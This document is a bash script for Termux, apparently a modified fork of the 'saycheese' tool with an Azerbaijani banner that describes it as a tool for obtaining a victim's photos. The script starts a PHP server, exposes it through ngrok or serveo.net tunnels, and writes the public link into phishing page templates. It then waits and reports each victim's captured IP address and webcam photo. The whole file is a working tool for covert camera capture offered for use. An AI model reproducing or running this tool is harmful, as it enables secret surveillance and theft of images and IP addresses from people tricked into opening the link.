#
#!/bin/bash
# coded by: github.com/thelinuxchoice/saycheese
# This script modified by hexatronn
#@@2222222
# If you use any part from this code, giving me the credits. Read the License!
clear
termux-setup-storage
pkg install php -y
pkg install wget -y
clear
trap 'printf "\n";stop' 2


banner() {


echo '
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
│HACKEZ Tool-a xos gelmisiniz :)                                                                                                               │
│Ngrok ve Serveo.net(local host) istifade ederek victim-in fotolarinin alinmasi aleti                                                                                                           │Termux ve Arch Linuxta test edilmisdir
│Made in Azerbaijan
│                                                                                                                                                 HEXATRONN :)     │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── '


echo " "
printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
printf "          \e[1;77m v1.1 This reborn script by { hexatronn }\e[0m \n"


printf "\n"


echo "      N073:> XAHIS EDIRIK HOTSPOT AKTIV OLARAQ QALSIN EKS HALDA LINK GENERASIYA OLUNMAYACAQ (PLEASE TURN ON YOUR HOTSPOT
                   OR ELSE YOU DONT GET LINK....!)"


}


stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi


if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}


dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "PHP install olunmayib, abort olunur..."; exit 1; }


}


catch_ip() {


ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip


cat ip.txt >> saved.ip.txt
}


checkfound() {


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Gozlenilir...,\e[0m\e[1;77m Cixis ucun Ctrl + C \e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Link acildi!\n"
catch_ip
rm -rf ip.txt


fi


sleep 0.5


if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto elde edildi! Baxmaq ucun move edin\e[0m\n"
rm -rf Log.log
fi
sleep 0.5


done 
}


server() {


command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH install olunmayib, abort edilir..."; exit 1; }


printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Serveo Basladilir...\e[0m\n"


if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi


if [[ $subdomain_resp == true ]]; then
# Ensuring correct link generation with the right options
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "$subdomain:80:localhost:3333" serveo.net > sendlink 2>&1 &


else
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
fi


sleep 8


send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
if [ -z "$send_link" ]; then
    printf "\e[1;93m[!] Serveo link generasiya olunmadi!\e[0m\n"
    exit 1
fi


printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link


}


ngrok_server() {

    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { echo >&2 "UNZIP yuklenilmeyib, legv edilir..."; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "WGET yuklenilmeyib, legv olunur..."; exit 1; }
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            else
                printf "\e[1;93m[!] Yuklenilme xetasi... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
                exit 1
            fi

        else
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            else
                printf "\e[1;93m[!]Yuklenilme xetasi... \e[0m\n"
                exit 1
            fi
        fi
    fi


printf "\e[1;92m[\e[0m+\e[1;92m] PHP server basladilir...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok server basladilir...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 15  # Increased wait time to ensure Ngrok is fully running

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    if [ -z "$link" ]; then
        printf "\e[1;93m[!] Ngrok link genrasiya olunmadi, sebekenizi bir daha yoxlayin...\e[0m\n"
        exit 1
    fi
    printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok link:\e[0m\e[1;77m %s\e[0m\n" $link

    payload_ngrok
    checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m+\e[0m\e[1;92m] Post Serveri sec: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then


command -v php > /dev/null 2>&1 || { echo >&2 "SSH install olunmayib, legv edilir..."; exit 1; }
start


elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Error (1 ve ya 2 secin!)\e[0m\n"
sleep 1
clear
start1
fi


}
payload_ngrok() {
    send_link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    sed 's+forwarding_link+'$send_link'+g' hackez.html > index2.html
    sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}


payload() {


send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)


sed 's+forwarding_link+'$send_link'+g' hackez.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}


start() {


default_choose_sub="Y"
default_subdomain="hackez"


printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Eminsiniz? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomen: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi


server
payload
checkfound


}


banner
dependencies
start1
